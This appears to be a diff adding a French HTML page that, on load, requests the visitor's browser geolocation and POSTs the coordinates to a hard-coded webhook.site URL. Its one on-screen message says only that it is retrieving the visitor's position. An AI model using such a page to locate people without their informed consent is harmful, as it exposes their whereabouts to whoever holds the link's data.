@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Partage de position</title>
+    <script>
+        function sendLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    const webhookUrl = "https://webhook.site/ea1296f8-c160-4dcc-8f20-20fd76622a6b"; // Remplace par ton URL Webhook.site
+                    const data = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: new Date().toISOString()
+                    };
+                    
+                    fetch(webhookUrl, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(data)
+                    }).then(() => {
+                        document.body.innerHTML = "<h2>Position envoyée avec succès !</h2>";
+                    }).catch(error => {
+                        document.body.innerHTML = "<h2>Erreur lors de l'envoi.</h2>";
+                    });
+                }, error => {
+                    document.body.innerHTML = "<h2>Impossible d'obtenir la position.</h2>";
+                });
+            } else {
+                document.body.innerHTML = "<h2>La géolocalisation n'est pas supportée.</h2>";
+            }
+        }
+    </script>
+</head>
+<body onload="sendLocation()">
+    <h1>Récupération de votre position...</h1>
+</body>
+</html>
+
